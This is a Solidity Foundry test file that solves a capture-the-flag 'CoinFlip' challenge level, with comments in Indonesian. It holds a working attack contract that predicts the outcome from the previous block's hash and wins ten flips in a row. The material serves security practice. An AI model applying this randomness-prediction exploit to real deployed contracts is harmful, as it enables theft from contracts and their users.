// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {CoinFlip} from "src/levels/CoinFlip.sol";
import {CoinFlipFactory} from "src/levels/CoinFlipFactory.sol";

contract CoinFlipAttack {
    CoinFlip public target;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _target) {
        target = CoinFlip(_target);
    }

    function attack() external {
        // Randomness = blockhash blok sebelumnya — dapat dihitung siapa saja.
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1;
        target.flip(side);
    }
}

contract CoinFlipSolve is Test {
    CoinFlipFactory factory;
    CoinFlip instance;
    CoinFlipAttack attacker;
    address player = address(0xBEEF);

    function setUp() public {
        factory = new CoinFlipFactory();
        instance = CoinFlip(factory.createInstance(player));
        attacker = new CoinFlipAttack(address(instance));
    }

    function testInit() public view {
        assertFalse(factory.validateInstance(payable(address(instance)), player));
    }

    function testSolve() public {
        // 10 kemenangan beruntun; tiap flip harus di blok berbeda (lastHash).
        for (uint256 i = 0; i < 10; i++) {
            vm.roll(block.number + 1);
            attacker.attack();
        }
        assertEq(instance.consecutiveWins(), 10);
        assertTrue(factory.validateInstance(payable(address(instance)), player));
    }
}
